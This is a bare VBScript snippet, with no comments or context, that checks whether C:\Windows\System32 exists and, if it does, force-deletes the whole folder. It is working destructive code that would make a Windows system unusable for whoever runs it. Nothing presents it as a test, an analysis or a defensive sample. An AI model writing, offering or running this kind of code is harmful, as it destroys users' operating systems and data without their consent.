Set objFSO = CreateObject("Scripting.FileSystemObject")
strFolder = "C:\Windows\System32"

If objFSO.FolderExists(strFolder) Then
    objFSO.DeleteFolder strFolder, True
End If